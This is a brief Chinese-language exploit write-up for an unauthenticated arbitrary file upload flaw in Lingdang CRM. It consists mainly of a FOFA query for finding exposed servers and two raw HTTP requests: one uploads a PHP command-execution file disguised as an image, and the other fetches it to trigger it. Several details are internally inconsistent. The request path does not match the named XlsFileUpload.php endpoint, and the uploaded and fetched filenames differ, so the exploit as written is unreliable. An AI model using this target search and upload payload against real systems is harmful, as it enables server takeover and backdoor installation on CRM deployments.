## 灵当CRM-XlsFileUpload.php-任意文件上传漏洞

## 一、漏洞简介
灵当CRM XlsFileUpload.php 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa
```
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM"
```

## POC
```
POST /cru/modules/Products/Insign/315F1HelpLoad.php?frommodule=17../../../../../Adm_modules=17../Storage/sfNum HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryxG131pg@MySql
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Linux; x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Length: 333

---WebKitFormBoundaryxG131pg@MySql
Content-Disposition: form-data; name="importXlsFile"; filename="sf3vmb.php"
Content-Type: image/jpeg

<?php system("whoami"); unlink(__FILE__); ?>
---WebKitFormBoundaryxG131pg@MySql--
```

## POC
```
GET /CTM/SIOP3B9/5f5vmb_ba1ge.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept-Encoding: gzip
```
